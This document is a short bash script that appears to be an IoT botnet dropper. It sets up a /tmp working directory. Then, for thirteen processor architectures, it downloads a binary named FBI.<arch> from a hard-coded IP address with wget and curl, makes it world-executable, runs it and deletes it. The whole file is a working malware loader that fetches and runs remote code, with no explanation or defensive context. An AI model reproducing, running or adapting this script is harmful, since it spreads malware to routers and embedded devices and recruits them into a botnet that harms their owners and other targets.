#!/bin/bash
ulimit -n 1024
cp /bin/busybox /tmp/
cd /tmp; wget http://37.44.238.187/FBI.i486; curl -O http://37.44.238.187/FBI.i486; chmod 777 FBI.i486; ./FBI.i486 qt.i486.wget; rm -rf FBI.i486
cd /tmp; wget http://37.44.238.187/FBI.x86_64; curl -O http://37.44.238.187/FBI.x86_64; chmod 777 FBI.x86_64; ./FBI.x86_64 qt.x86_64.wget; rm -rf FBI.x86_64
cd /tmp; wget http://37.44.238.187/FBI.i586; curl -O http://37.44.238.187/FBI.i586; chmod 777 FBI.i586; ./FBI.i586 qt.i586.wget; rm -rf FBI.i586
cd /tmp; wget http://37.44.238.187/FBI.i686; curl -O http://37.44.238.187/FBI.i686; chmod 777 FBI.i686; ./FBI.i686 qt.i686.wget; rm -rf FBI.i686
cd /tmp; wget http://37.44.238.187/FBI.mips; curl -O http://37.44.238.187/FBI.mips; chmod 777 FBI.mips; ./FBI.mips qt.mips.wget; rm -rf FBI.mips
cd /tmp; wget http://37.44.238.187/FBI.mipsel; curl -O http://37.44.238.187/FBI.mipsel; chmod 777 FBI.mipsel; ./FBI.mipsel qt.mipsel.wget; rm -rf FBI.mipsel
cd /tmp; wget http://37.44.238.187/FBI.arm; curl -O http://37.44.238.187/FBI.arm; chmod 777 FBI.arm; ./FBI.arm qt.arm.wget; rm -rf FBI.arm
cd /tmp; wget http://37.44.238.187/FBI.arm5; curl -O http://37.44.238.187/FBI.arm5; chmod 777 FBI.arm5; ./FBI.arm5 qt.arm5.wget; rm -rf FBI.arm5
cd /tmp; wget http://37.44.238.187/FBI.arm6; curl -O http://37.44.238.187/FBI.arm6; chmod 777 FBI.arm6; ./FBI.arm6 qt.arm6.wget; rm -rf FBI.arm6
cd /tmp; wget http://37.44.238.187/FBI.arm7; curl -O http://37.44.238.187/FBI.arm7; chmod 777 FBI.arm7; ./FBI.arm7 qt.arm7.wget; rm -rf FBI.arm7
cd /tmp; wget http://37.44.238.187/FBI.ppc; curl -O http://37.44.238.187/FBI.ppc; chmod 777 FBI.ppc; ./FBI.ppc qt.ppc.wget; rm -rf FBI.ppc
cd /tmp; wget http://37.44.238.187/FBI.m68k; curl -O http://37.44.238.187/FBI.m68k; chmod 777 FBI.m68k; ./FBI.m68k qt.m68k.wget; rm -rf FBI.m68k
cd /tmp; wget http://37.44.238.187/FBI.sh4; curl -O http://37.44.238.187/FBI.sh4; chmod 777 FBI.sh4; ./FBI.sh4 qt.sh4.wget; rm -rf FBI.sh4
